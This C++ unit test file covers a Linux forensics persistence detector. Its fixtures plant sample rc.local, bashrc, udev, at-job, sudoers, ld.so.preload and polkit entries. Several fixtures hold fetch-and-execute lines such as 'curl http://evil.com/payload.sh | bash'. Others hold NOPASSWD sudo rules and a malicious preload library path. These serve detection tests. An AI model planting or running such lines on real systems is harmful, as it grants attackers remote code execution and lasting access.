// test_persistence_detector.cpp
// Unit tests for PersistenceDetector

#ifdef linux
#undef linux
#endif

#include <gtest/gtest.h>
#include "Analysis/PersistenceDetector.h"
#include <fstream>
#include <filesystem>

using namespace forensics::linux;
namespace fs = std::filesystem;

class PersistenceDetectorTest : public ::testing::Test {
protected:
    std::string testDir;

    void SetUp() override {
        // Create temporary test directory structure
        testDir = "/tmp/persistence_test_" + std::to_string(getpid());
        fs::create_directories(testDir + "/etc");
        fs::create_directories(testDir + "/etc/init.d");
        fs::create_directories(testDir + "/etc/sudoers.d");
        fs::create_directories(testDir + "/etc/udev/rules.d");
        fs::create_directories(testDir + "/etc/polkit-1/rules.d");
        fs::create_directories(testDir + "/etc/xinetd.d");
        fs::create_directories(testDir + "/etc/systemd/system");
        fs::create_directories(testDir + "/var/spool/at");
        fs::create_directories(testDir + "/home/testuser");
    }

    void TearDown() override {
        // Clean up test directory
        fs::remove_all(testDir);
    }

    void createFile(const std::string& path, const std::string& content) {
        std::ofstream file(testDir + path);
        file << content;
        file.close();
    }
};

// ============================================================================
// rc.local Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectRcLocalBasic) {
    createFile("/etc/rc.local", "#!/bin/bash\n/usr/local/bin/startup.sh\nexit 0\n");

    auto entries = PersistenceDetector::detectRcLocal(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].type, PersistenceType::RC_LOCAL);
    EXPECT_EQ(entries[0].command, "/usr/local/bin/startup.sh");
    EXPECT_EQ(entries[0].filePath, "/etc/rc.local");
}

TEST_F(PersistenceDetectorTest, DetectRcLocalSuspicious) {
    createFile("/etc/rc.local", "#!/bin/bash\ncurl http://evil.com/payload.sh | bash\nexit 0\n");

    auto entries = PersistenceDetector::detectRcLocal(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_TRUE(entries[0].isSuspicious);
    EXPECT_NE(entries[0].suspiciousReason.find("curl"), std::string::npos);
}

TEST_F(PersistenceDetectorTest, NoRcLocal) {
    auto entries = PersistenceDetector::detectRcLocal(testDir);
    EXPECT_TRUE(entries.empty());
}

TEST_F(PersistenceDetectorTest, RcLocalEmptyFile) {
    createFile("/etc/rc.local", "");

    auto entries = PersistenceDetector::detectRcLocal(testDir);
    EXPECT_TRUE(entries.empty());
}

// ============================================================================
// init.d Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectInitDScript) {
    createFile("/etc/init.d/myservice", "#!/bin/bash\nDAEMON=/usr/bin/myapp\n");

    auto entries = PersistenceDetector::detectInitDScripts(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].type, PersistenceType::INIT_D_SCRIPT);
    EXPECT_EQ(entries[0].entryName, "myservice");
}

TEST_F(PersistenceDetectorTest, NoInitDDirectory) {
    fs::remove_all(testDir + "/etc/init.d");

    auto entries = PersistenceDetector::detectInitDScripts(testDir);
    EXPECT_TRUE(entries.empty());
}

// ============================================================================
// Shell Profile Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectSystemProfile) {
    createFile("/etc/profile", "# System profile\nexport PATH=/usr/bin\nsource /etc/bash.bashrc\n");

    auto entries = PersistenceDetector::detectShellProfiles(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].type, PersistenceType::SHELL_PROFILE);
    EXPECT_EQ(entries[0].filePath, "/etc/profile");
}

TEST_F(PersistenceDetectorTest, DetectUserBashrc) {
    createFile("/home/testuser/.bashrc", "# User bashrc\nsource ~/.aliases\nalias ll='ls -la'\n");

    auto entries = PersistenceDetector::detectShellProfiles(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].username, "testuser");
}

TEST_F(PersistenceDetectorTest, DetectSuspiciousProfile) {
    createFile("/home/testuser/.bashrc", "eval $(curl -s http://evil.com/payload)\n");

    auto entries = PersistenceDetector::detectShellProfiles(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_TRUE(entries[0].isSuspicious);
}

// ============================================================================
// ld.so.preload Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectLdSoPreload) {
    createFile("/etc/ld.so.preload", "/lib/libmalware.so\n");

    auto entries = PersistenceDetector::detectLdSoPreload(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].type, PersistenceType::LD_SO_PRELOAD);
    EXPECT_TRUE(entries[0].isSuspicious);
    EXPECT_EQ(entries[0].risk, PersistenceRisk::CRITICAL);
}

TEST_F(PersistenceDetectorTest, NoLdSoPreload) {
    auto entries = PersistenceDetector::detectLdSoPreload(testDir);
    EXPECT_TRUE(entries.empty());
}

// ============================================================================
// Sudoers Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectSudoersNopasswd) {
    createFile("/etc/sudoers", "testuser ALL=(ALL) NOPASSWD: ALL\n");

    auto entries = PersistenceDetector::detectSudoers(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].type, PersistenceType::SUDOERS);
    EXPECT_TRUE(entries[0].isSuspicious);
}

TEST_F(PersistenceDetectorTest, DetectSudoersDropIn) {
    createFile("/etc/sudoers.d/custom", "deploy ALL=(ALL) NOPASSWD: /usr/bin/systemctl\n");

    auto entries = PersistenceDetector::detectSudoers(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].filePath, "/etc/sudoers.d/custom");
}

TEST_F(PersistenceDetectorTest, SudoersCommentsIgnored) {
    createFile("/etc/sudoers", "# This is a comment\ntestuser ALL=(ALL) ALL\n");

    auto entries = PersistenceDetector::detectSudoers(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].command, "testuser ALL=(ALL) ALL");
}

// ============================================================================
// udev Rules Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectUdevRuleWithRun) {
    createFile("/etc/udev/rules.d/99-custom.rules",
        "ACTION==\"add\", SUBSYSTEM==\"usb\", RUN+=\"/usr/local/bin/usb-handler.sh\"\n");

    auto entries = PersistenceDetector::detectUdevRules(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].type, PersistenceType::UDEV_RULE);
}

TEST_F(PersistenceDetectorTest, UdevRuleWithoutRunIgnored) {
    createFile("/etc/udev/rules.d/10-network.rules",
        "SUBSYSTEM==\"net\", NAME=\"eth0\"\n");

    auto entries = PersistenceDetector::detectUdevRules(testDir);

    EXPECT_TRUE(entries.empty());
}

TEST_F(PersistenceDetectorTest, SuspiciousUdevRule) {
    createFile("/etc/udev/rules.d/99-evil.rules",
        "ACTION==\"add\", RUN+=\"/bin/bash -c 'curl http://evil.com | bash'\"\n");

    auto entries = PersistenceDetector::detectUdevRules(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_TRUE(entries[0].isSuspicious);
}

// ============================================================================
// Polkit Rules Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectPolkitRule) {
    createFile("/etc/polkit-1/rules.d/10-custom.rules",
        "polkit.addRule(function(action, subject) {\n"
        "    if (action.id == \"org.freedesktop.systemd1.manage-units\") {\n"
        "        return polkit.Result.YES;\n"
        "    }\n"
        "});\n");

    auto entries = PersistenceDetector::detectPolkitRules(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].type, PersistenceType::POLKIT_RULE);
    EXPECT_TRUE(entries[0].isSuspicious);
}

TEST_F(PersistenceDetectorTest, PolkitRuleAuthAdminNotSuspicious) {
    createFile("/etc/polkit-1/rules.d/10-custom.rules",
        "polkit.addRule(function(action, subject) {\n"
        "    return polkit.Result.AUTH_ADMIN_KEEP;\n"
        "});\n");

    auto entries = PersistenceDetector::detectPolkitRules(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_FALSE(entries[0].isSuspicious);
}

// ============================================================================
// xinetd Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectXinetdService) {
    createFile("/etc/xinetd.d/telnet",
        "service telnet\n"
        "{\n"
        "    disable = no\n"
        "    server = /usr/sbin/in.telnetd\n"
        "}\n");

    auto entries = PersistenceDetector::detectXinetdServices(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].type, PersistenceType::XINETD_SERVICE);
    EXPECT_TRUE(entries[0].isEnabled);
    EXPECT_EQ(entries[0].command, "/usr/sbin/in.telnetd");
}

TEST_F(PersistenceDetectorTest, XinetdServiceDisabled) {
    createFile("/etc/xinetd.d/telnet",
        "service telnet\n"
        "{\n"
        "    disable = yes\n"
        "    server = /usr/sbin/in.telnetd\n"
        "}\n");

    auto entries = PersistenceDetector::detectXinetdServices(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_FALSE(entries[0].isEnabled);
}

// ============================================================================
// Systemd Timer Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectSystemdTimer) {
    createFile("/etc/systemd/system/cleanup.timer",
        "[Unit]\n"
        "Description=Cleanup Timer\n"
        "\n"
        "[Timer]\n"
        "OnCalendar=daily\n"
        "Unit=cleanup.service\n"
        "\n"
        "[Install]\n"
        "WantedBy=timers.target\n");

    auto entries = PersistenceDetector::detectSystemdTimers(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].type, PersistenceType::SYSTEMD_TIMER);
    EXPECT_EQ(entries[0].schedule, "daily");
    EXPECT_EQ(entries[0].command, "cleanup.service");
}

TEST_F(PersistenceDetectorTest, NoSystemdTimers) {
    auto entries = PersistenceDetector::detectSystemdTimers(testDir);
    EXPECT_TRUE(entries.empty());
}

// ============================================================================
// at Job Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectAtJob) {
    createFile("/var/spool/at/a0000101",
        "#!/bin/sh\n"
        "# atrun uid=0 gid=0\n"
        "# mail root 0\n"
        "/usr/local/bin/backup.sh\n");

    auto entries = PersistenceDetector::detectAtJobs(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].type, PersistenceType::AT_JOB);
    EXPECT_EQ(entries[0].entryName, "a0000101");
}

TEST_F(PersistenceDetectorTest, AtJobSuspiciousCommand) {
    createFile("/var/spool/at/a0000201",
        "#!/bin/sh\n"
        "curl http://evil.com/payload.sh | bash\n");

    auto entries = PersistenceDetector::detectAtJobs(testDir);

    ASSERT_GE(entries.size(), 1);
    EXPECT_TRUE(entries[0].isSuspicious);
}

TEST_F(PersistenceDetectorTest, NoAtJobs) {
    auto entries = PersistenceDetector::detectAtJobs(testDir);
    EXPECT_TRUE(entries.empty());
}

// ============================================================================
// Risk Assessment Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, RiskLdSoPreloadCritical) {
    PersistenceEntry entry;
    entry.type = PersistenceType::LD_SO_PRELOAD;
    entry.command = "/lib/libtest.so";

    auto risk = PersistenceDetector::assessRisk(entry);
    EXPECT_EQ(risk, PersistenceRisk::CRITICAL);
}

TEST_F(PersistenceDetectorTest, RiskSuspiciousCommandHigh) {
    PersistenceEntry entry;
    entry.type = PersistenceType::RC_LOCAL;
    entry.command = "curl http://evil.com";
    entry.isSuspicious = true;

    auto risk = PersistenceDetector::assessRisk(entry);
    EXPECT_EQ(risk, PersistenceRisk::HIGH);
}

TEST_F(PersistenceDetectorTest, RiskSudoersNopasswdHigh) {
    PersistenceEntry entry;
    entry.type = PersistenceType::SUDOERS;
    entry.command = "user ALL=(ALL) NOPASSWD: ALL";

    auto risk = PersistenceDetector::assessRisk(entry);
    EXPECT_EQ(risk, PersistenceRisk::HIGH);
}

TEST_F(PersistenceDetectorTest, RiskStandardSystemLow) {
    PersistenceEntry entry;
    entry.type = PersistenceType::SYSTEMD_TIMER;
    entry.command = "backup.service";

    auto risk = PersistenceDetector::assessRisk(entry);
    EXPECT_EQ(risk, PersistenceRisk::LOW);
}

// ============================================================================
// Type/Risk String Conversion Tests
// ============================================================================

TEST_F(PersistenceDetectorTest, TypeToString) {
    EXPECT_EQ(PersistenceDetector::typeToString(PersistenceType::RC_LOCAL), "RC_LOCAL");
    EXPECT_EQ(PersistenceDetector::typeToString(PersistenceType::LD_SO_PRELOAD), "LD_SO_PRELOAD");
    EXPECT_EQ(PersistenceDetector::typeToString(PersistenceType::SUDOERS), "SUDOERS");
    EXPECT_EQ(PersistenceDetector::typeToString(PersistenceType::SYSTEMD_TIMER), "SYSTEMD_TIMER");
}

TEST_F(PersistenceDetectorTest, RiskToString) {
    EXPECT_EQ(PersistenceDetector::riskToString(PersistenceRisk::LOW), "LOW");
    EXPECT_EQ(PersistenceDetector::riskToString(PersistenceRisk::MEDIUM), "MEDIUM");
    EXPECT_EQ(PersistenceDetector::riskToString(PersistenceRisk::HIGH), "HIGH");
    EXPECT_EQ(PersistenceDetector::riskToString(PersistenceRisk::CRITICAL), "CRITICAL");
}

// ============================================================================
// detectAll Integration Test
// ============================================================================

TEST_F(PersistenceDetectorTest, DetectAllIntegration) {
    // Create multiple persistence mechanisms
    createFile("/etc/rc.local", "#!/bin/bash\n/usr/bin/startup.sh\n");
    createFile("/etc/ld.so.preload", "/lib/libtest.so\n");
    createFile("/etc/sudoers", "testuser ALL=(ALL) NOPASSWD: ALL\n");
    createFile("/etc/systemd/system/backup.timer",
        "[Timer]\nOnCalendar=daily\nUnit=backup.service\n");

    auto entries = PersistenceDetector::detectAll(testDir);

    // Should find at least rc.local, ld.so.preload, sudoers, timer
    EXPECT_GE(entries.size(), 4);

    // Check that risk assessment was applied
    bool foundCritical = false;
    bool foundHigh = false;
    for (const auto& entry : entries) {
        if (entry.risk == PersistenceRisk::CRITICAL) foundCritical = true;
        if (entry.risk == PersistenceRisk::HIGH) foundHigh = true;
    }
    EXPECT_TRUE(foundCritical); // ld.so.preload
    EXPECT_TRUE(foundHigh);     // sudoers NOPASSWD
}

// ============================================================================
// Edge Cases
// ============================================================================

TEST_F(PersistenceDetectorTest, EmptyExtractDir) {
    auto entries = PersistenceDetector::detectAll("/nonexistent/path");
    EXPECT_TRUE(entries.empty());
}

TEST_F(PersistenceDetectorTest, RcLocalCommentsOnly) {
    createFile("/etc/rc.local", "#!/bin/bash\n# This is a comment\n# Another comment\n");

    auto entries = PersistenceDetector::detectRcLocal(testDir);
    EXPECT_TRUE(entries.empty());
}

TEST_F(PersistenceDetectorTest, SudoersIncludeDirectivesSkipped) {
    createFile("/etc/sudoers", "@includedir /etc/sudoers.d\ntestuser ALL=(ALL) ALL\n");

    auto entries = PersistenceDetector::detectSudoers(testDir);

    // Should only have the user rule, not the @includedir
    ASSERT_GE(entries.size(), 1);
    EXPECT_EQ(entries[0].command, "testuser ALL=(ALL) ALL");
}

int main(int argc, char** argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
